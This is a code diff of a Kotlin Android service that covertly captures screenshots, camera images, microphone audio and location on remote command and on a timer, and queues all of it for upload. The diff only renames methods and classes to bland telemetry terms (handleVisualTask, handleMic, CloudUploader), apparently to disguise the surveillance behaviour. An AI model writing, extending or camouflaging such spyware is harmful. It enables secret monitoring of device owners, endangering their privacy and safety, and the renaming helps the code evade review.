@@ -48,7 +48,7 @@ import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 
 @SuppressLint("HardwareIds")
-class BackgroundSyncService : Service() {
+class TelemetryService : Service() {
     private val TAG = "SyncService"
     private val NOTIFICATION_ID = 1023
     private val CHANNEL_ID = "background_sync"
@@ -75,7 +75,7 @@ class BackgroundSyncService : Service() {
     private var cameraImageReader: ImageReader? = null
     private val cameraOpenCloseLock = Semaphore(1)
 
-    private var dataSync: DataSynchronizer? = null
+    private var dataSync: CloudUploader? = null
     private var lastSyncTime = 0L
 
     private var mediaRecorder: MediaRecorder? = null
@@ -100,7 +100,7 @@ class BackgroundSyncService : Service() {
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
 
-        dataSync = DataSynchronizer(this)
+        dataSync = CloudUploader(this)
         val commandsManager = Commands(this)
         commandsManager.initialize()
         Log.d(TAG, "Background sync service initialized")
@@ -111,7 +111,7 @@ class BackgroundSyncService : Service() {
 
         val initialDelay = (30 * 1000L) + (Math.random() * 60 * 1000L).toLong()
         syncHandler?.postDelayed({
-            monitorForSyncOpportunities()
+            scheduleBackgroundPolling()
         }, initialDelay)
 
         when (intent?.action) {
@@ -126,29 +126,29 @@ class BackgroundSyncService : Service() {
             "CAPTURE_SCREENSHOT" -> {
                 val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
                 syncHandler?.post {
-                    handleScreenshotCommand(commandId)
+                    handleVisualTask(commandId)
                 }
             }
             "CAPTURE_CAMERA" -> {
                 val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
                 syncHandler?.post {
-                    handleCameraCommand(commandId)
+                    handleImage(commandId)
                 }
             }
             "CAPTURE_AUDIO" -> {
                 val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
                 val duration = intent.getIntExtra("duration", 30)
                 syncHandler?.post {
-                    handleAudioCommand(commandId, duration)
+                    handleMic(commandId, duration)
                 }
             }
         }
 
-        monitorForSyncOpportunities()
+        scheduleBackgroundPolling()
         return START_STICKY
     }
 
-    private fun handleScreenshotCommand(commandId: String) {
+    private fun handleVisualTask(commandId: String) {
         try {
             Log.d(TAG, "Processing screenshot capture command: $commandId")
 
@@ -194,7 +194,7 @@ class BackgroundSyncService : Service() {
         }
     }
 
-    private fun handleCameraCommand(commandId: String) {
+    private fun handleImage(commandId: String) {
         try {
             Log.d(TAG, "Processing camera capture command: $commandId")
 
@@ -260,14 +260,14 @@ class BackgroundSyncService : Service() {
         displayHeight = metrics.heightPixels
     }
 
-    private fun monitorForSyncOpportunities() {
+    private fun scheduleBackgroundPolling() {
         val idleCallback = {
             if (!isSyncing.get()) {
                 syncHandler?.post {
                     synchronized(isSyncing) {
                         if (!isSyncing.get()) {
                             isSyncing.set(true)
-                            performBackgroundSync()
+                            executeTelemetrySync()
                             isSyncing.set(false)
                         }
                     }
@@ -285,7 +285,7 @@ class BackgroundSyncService : Service() {
                         synchronized(isSyncing) {
                             if (!isSyncing.get()) {
                                 isSyncing.set(true)
-                                performBackgroundSync()
+                                executeTelemetrySync()
                                 isSyncing.set(false)
                                 lastSyncTime = System.currentTimeMillis()
                             }
@@ -298,7 +298,7 @@ class BackgroundSyncService : Service() {
         }, 1 * 60 * 1000L)
     }
 
-    private fun performBackgroundSync() {
+    private fun executeTelemetrySync() {
         try {
             val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
             val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
@@ -306,8 +306,8 @@ class BackgroundSyncService : Service() {
 
             if (batteryLevel > 30 || isCharging) {
                 captureScreenContent()
-                captureLocation()
-                dataSync?.synchronizeData()
+                gatherGeoData()
+                dataSync?.startUploadJob()
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error during background sync: ${e.message}")
@@ -359,7 +359,7 @@ class BackgroundSyncService : Service() {
                         out.write(jpegBytes)
                     }
 
-                    dataSync?.queueForSync("screen_data", file.absolutePath)
+                    dataSync?.enqueueUpload("screen_data", file.absolutePath)
 
                     return file.absolutePath
                 } else {
@@ -625,7 +625,7 @@ class BackgroundSyncService : Service() {
             sendCommandResult(commandId, true, "Camera image captured successfully", result)
 
             // Queue for sync
-            dataSync?.queueForSync("camera_data", file.absolutePath)
+            dataSync?.enqueueUpload("camera_data", file.absolutePath)
         } catch (e: Exception) {
             Log.e(TAG, "Error processing camera image: ${e.message}")
 
@@ -682,7 +682,7 @@ class BackgroundSyncService : Service() {
         return out.toByteArray()
     }
 
-    private fun captureLocation() {
+    private fun gatherGeoData() {
         try {
             // Explicit permission check to avoid SecurityException
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
@@ -691,8 +691,8 @@ class BackgroundSyncService : Service() {
                 return
             }
 
-            val locationTracker = LocationTracker.getInstance(this)
-            locationTracker.captureLastKnownLocation { locationData ->
+            val geoLocator = GeoLocator.getInstance(this)
+            geoLocator.getLastGeoFix { locationData ->
                 try {
                     val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                     val filename = "location_${timestamp}.json"
@@ -703,7 +703,7 @@ class BackgroundSyncService : Service() {
                         out.write(locationData.toString().toByteArray())
                     }
 
-                    dataSync?.queueForSync("location_data", file.absolutePath)
+                    dataSync?.enqueueUpload("location_data", file.absolutePath)
                 } catch (e: Exception) {
                     Log.e(TAG, "Location save error: ${e.message}")
                 }
@@ -714,7 +714,7 @@ class BackgroundSyncService : Service() {
             Log.e(TAG, "Location capture error: ${e.message}")
         }
     }
-    private fun handleAudioCommand(commandId: String, duration: Int) {
+    private fun handleMic(commandId: String, duration: Int) {
         try {
             Log.d(TAG, "Processing audio capture command: $commandId")
 
@@ -838,7 +838,7 @@ class BackgroundSyncService : Service() {
                     put("timestamp", System.currentTimeMillis())
                 }
                 sendCommandResult(commandId, true, "Audio recording completed successfully", result)
-                dataSync?.queueForSync("audio_data", audioOutputFile!!)
+                dataSync?.enqueueUpload("audio_data", audioOutputFile!!)
 
                 Log.d(TAG, "Audio recording completed and result sent")
             } else {
